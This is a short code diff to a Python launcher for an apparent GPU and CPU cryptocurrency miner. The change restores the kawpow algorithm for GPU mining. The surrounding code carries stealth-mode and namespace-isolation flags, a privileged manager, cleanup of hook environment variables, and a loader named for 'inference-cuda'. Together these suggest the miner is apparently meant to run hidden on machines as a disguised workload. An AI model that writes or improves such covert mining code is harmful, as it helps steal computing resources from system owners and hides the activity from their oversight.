@@ -84,6 +84,7 @@ def create_clean_gpu_environment():
         logger.info(f"🧹 [GPU HOOK CLEANUP] No GPU hook variables found to remove")
     
     return clean_env
+
 from mining_environment.logging.mining_performance_logger import (
     register_mining_process,
     log_hash_rate,
@@ -93,6 +94,8 @@ from mining_environment.logging.mining_performance_logger import (
     generate_performance_comparison,
     mining_perf_logger
 )
+
+
 
 # Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
@@ -534,10 +537,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
         logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
         logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")
         
-        # 🧪 TEST: Use same algorithm as CPU for compatibility test
-        # Original: mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
-        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'rx/0'])
-        logger.info(f"🧪 GPU Mining - Using rx/0 algorithm for compatibility test")
+        # 🎯 PRODUCTION: Use GPU-optimized KawPoW algorithm for inference-cuda
+        # Fixed: Restore kawpow algorithm for proper GPU mining operation
+        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
+        logger.info(f"🎮 GPU Mining - Using kawpow algorithm for GPU mining")
 
     enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
